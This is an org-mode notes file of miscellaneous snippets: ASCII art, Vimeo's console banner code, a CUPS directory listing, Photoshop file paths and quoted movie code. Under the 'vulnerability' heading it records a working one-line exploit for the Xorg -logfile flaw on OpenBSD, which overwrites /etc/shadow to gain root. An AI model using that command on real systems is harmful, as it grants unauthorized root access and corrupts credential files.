#+OPTIONS: toc:nil -:nil H:6 ^:nil
#+EXCLUDE_TAGS: noexport
#+BEGIN_EXAMPLE
---
title: "Misc"
layout: notation
description:
path: "/misc/"
---
#+END_EXAMPLE

* ascii art

** rad

#+BEGIN_EXAMPLE
____/\\\\\\\\\_________/\\\\\\\\\_____/\\\\\\\\\\\\____
 __/\\\///////\\\_____/\\\\\\\\\\\\\__\/\\\////////\\\__
  _\/\\\_____\/\\\____/\\\/////////\\\_\/\\\______\//\\\_
   _\/\\\\\\\\\\\/____\/\\\_______\/\\\_\/\\\_______\/\\\_
    _\/\\\//////\\\____\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_
     _\/\\\____\//\\\___\/\\\/////////\\\_\/\\\_______\/\\\_
      _\/\\\_____\//\\\__\/\\\_______\/\\\_\/\\\_______/\\\__
       _\/\\\______\//\\\_\/\\\_______\/\\\_\/\\\\\\\\\\\\/___
        _\///________\///__\///________\///__\////////////_____
#+END_EXAMPLE

** v
#+BEGIN_SRC js
console.log('%c \n\
⎜       @@@&       @@@@@@\n\
⎜    #@@@@@@@    &@@@@@@@@       Built using:\n\
⎜  #@@@@@@@@@.  %%&@@@@@@@        • React + Flux\n\
⎜      &@@@@@%     (@@@@@(       • ES6\n\
⎜       @@@@@@     @@@@@@        • Fetch API\n\
⎜       %@@@@@(  .@@@@@(         • Flexbox\n\
⎜        @@@@@@(@@@@@@\n\
⎜        /@@@@@@@@@@%            Like playing with new technology, too?\n\
⎜         &@@@@@@@%              https://vimeo.com/jobs\n\
⎜          @@@@@#\n\
\n\
', 'color: #00adef;');
#+END_SRC

#+RESULTS:
#+begin_example
%c
⎜       @@@&       @@@@@@
⎜    #@@@@@@@    &@@@@@@@@       Built using:
⎜  #@@@@@@@@@.  %&@@@@@@@        • React + Flux
⎜      &@@@@@%     (@@@@@(       • ES6
⎜       @@@@@@     @@@@@@        • Fetch API
⎜       %@@@@@(  .@@@@@(         • Flexbox
⎜        @@@@@@(@@@@@@
⎜        /@@@@@@@@@@%            Like playing with new technology, too?
⎜         &@@@@@@@%              https://vimeo.com/jobs
⎜          @@@@@#

 color: #00adef;
undefined
#+end_example

* animation

[[https://www.html5rocks.com/en/tutorials/speed/high-performance-animations/][High Performance Animations]], by Paul Lewis and Paul Irish

* .cups file in root `~/.cups/lpoptions`


#+BEGIN_SRC sh
  /Users/recurvirostridae/.cups:
  total used in directory 4.0K available 4289603487
  drwx------    3 recurvirostridae staff  102 Aug 28  2017 .
  drwxr-xr-x+ 275 recurvirostridae staff 9.2K Mar 15 12:28 ..
  -rw-r--r--    1 recurvirostridae staff   30 Sep 23 12:40 lpoptions
#+END_SRC

* Photoshop

| copyright & metadata location | ~/Library/Application Support/Adobe/XMP/Metadata Templates/~ |
| color profiles                | ~/Library/ColorSync/Profiles/~                               |

* tracing :noexport:

https://explog.in/notes/tracers.html

* vulnerability

OpenBSD Xorg priv escalation ([[https://arstechnica.com/information-technology/2018/10/x-org-bug-that-gives-attackers-root-bites-openbsd-and-other-big-name-oses/][ref]]):

#+BEGIN_SRC sh
cd /etc; Xorg -fp
"Root::16431:0:99999:7:::" -logfile
shadow  :1;su
#+END_SRC

* movie code

** from https://www.youtube.com/watch?v=THN42GYtWrw

> The compression is awesome.

> Structure's perfect.


#+BEGIN_SRC c
{

/* ... */

    for (; i < nread; i++) {
        if (buf[i] == (byte)'\n' || buf[i] == (byte)'\r') {
            break outerloop;
        }
    }
}

boolean doingGet;
int index;
if (buf[0] == (byte)'G' &&
    buf[1] == (byte)'E' &&
    buf[2] == (byte)'T' &&
    buf[3] == (byte)' ') {
    doingGet = true;
    index = 4;
} else if (buf[0] == (byte)'H' &&
        buf[1] == (byte)'E' &&
        buf[2] == (byte)'A' &&
        buf[3] == (byte)'D' &&
        buf[4] == (byte)' ') {
    doingGet = false;
    index = 5
} else {

/* ... */

}
#+END_SRC
